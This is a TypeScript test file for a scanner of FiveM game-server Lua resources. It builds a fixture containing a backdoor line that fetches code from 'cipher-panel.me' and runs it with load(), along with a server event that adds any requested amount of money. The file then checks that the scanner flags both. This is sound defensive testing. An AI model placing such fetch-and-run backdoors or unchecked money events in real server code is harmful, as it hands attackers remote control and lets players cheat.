import assert from 'node:assert/strict';
import { execFile } from 'node:child_process';
import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, before, describe, it } from 'node:test';
import { promisify } from 'node:util';
import { formatJson, formatSarif } from '../src/report/machine.ts';
import { formatText } from '../src/report/text.ts';
import { scan } from '../src/scanner.ts';

const run = promisify(execFile);
const CLI = join(import.meta.dirname, '..', 'src', 'cli.ts');

let root = '';

async function put(path: string, content: string | Buffer): Promise<void> {
  const full = join(root, path);
  await mkdir(join(full, '..'), { recursive: true });
  await writeFile(full, content);
}

before(async () => {
  root = await mkdtemp(join(tmpdir(), 'fivem-sentinel-'));
  await put('[shops]/bad_shop/fxmanifest.lua', "fx_version 'cerulean'\ngame 'gta5'\nserver_scripts { 'sv/*.lua' }\nclient_script 'cl.lua'");
  await put('[shops]/bad_shop/sv/main.lua', "RegisterNetEvent('shop:buy', function(amount)\n  xPlayer.addMoney(amount)\nend)\nPerformHttpRequest('https://cipher-panel.me/x', function(e, d) load(d)() end)");
  await put('[shops]/bad_shop/cl.lua', "RegisterNetEvent('shop:buy', function(amount)\n  xPlayer.addMoney(amount)\nend)");
  await put('[shops]/bad_shop/stream/model.ydr', Buffer.from([0, 1, 2, 3]));
  await put('clean/fxmanifest.lua', "fx_version 'cerulean'\ngame 'gta5'\nserver_script 'server.lua'");
  await put('clean/server.lua', "MySQL.query.await('SELECT 1 FROM users WHERE id = ?', { id })");
  await put('clean/node_modules/evil/index.js', 'eval(x)');
  await put('clean/data.bin.lua', Buffer.from([0x6c, 0x00, 0x6f]));
  try {
    await symlink(join(root, '[shops]'), join(root, 'clean', 'loop'), 'junction');
  } catch {
    return;
  }
});

after(async () => {
  await rm(root, { recursive: true, force: true });
});

describe('scan', () => {
  it('groups findings by resource and scores them', async () => {
    const result = await scan([root]);
    const bad = result.resources.find((r) => r.name === 'bad_shop');
    const clean = result.resources.find((r) => r.name === 'clean');
    assert.ok(bad && clean);
    assert.equal(clean.findings.length, 0);
    assert.equal(clean.score, 100);
    assert.ok(bad.score < 40);
    assert.deepEqual([...new Set(bad.findings.map((f) => f.ruleId))].sort(), ['FS001', 'FS002', 'FS006', 'FS008']);
    assert.ok(bad.findings.every((f) => !f.file.endsWith('cl.lua') || f.ruleId !== 'FS006'));
  });

  it('skips node_modules, stream folders, binaries and symlinks', async () => {
    const result = await scan([root]);
    assert.ok(result.findings.every((f) => !f.file.includes('node_modules') && !f.file.includes('loop')));
    assert.ok(result.stats.skipped >= 1);
  });

  it('respects ignore globs and severity floors', async () => {
    const ignored = await scan([root], { ignore: ['**/sv/**'] });
    assert.equal(ignored.findings.length, 0);
    const critical = await scan([root], { minSeverity: 'critical' });
    assert.ok(critical.findings.every((f) => f.severity === 'critical'));
  });

  it('renders text, json and sarif', async () => {
    const result = await scan([root]);
    assert.match(formatText(result, { color: false }), /bad_shop .*\/100/);
    assert.equal(JSON.parse(formatJson(result)).resources.length, result.resources.length);
    const sarif = JSON.parse(formatSarif(result));
    assert.equal(sarif.version, '2.1.0');
    assert.equal(sarif.runs[0].results.length, result.findings.length);
  });
});

describe('cli', () => {
  it('exits 1 when findings reach --fail-on and 0 otherwise', async () => {
    await assert.rejects(run(process.execPath, [CLI, root, '--no-color']), (e: { code: number }) => e.code === 1);
    const ok = await run(process.execPath, [CLI, join(root, 'clean'), '--no-color']);
    assert.match(ok.stdout, /No issues found/);
  });

  it('exits 2 on usage errors', async () => {
    await assert.rejects(run(process.execPath, [CLI, '--format', 'xml']), (e: { code: number; stderr: string }) => e.code === 2 && /Invalid --format/.test(e.stderr));
  });

  it('prints json', async () => {
    const out = await run(process.execPath, [CLI, root, '-f', 'json', '--fail-on', 'none']);
    assert.equal(JSON.parse(out.stdout).tool.name, 'fivem-sentinel');
  });
});
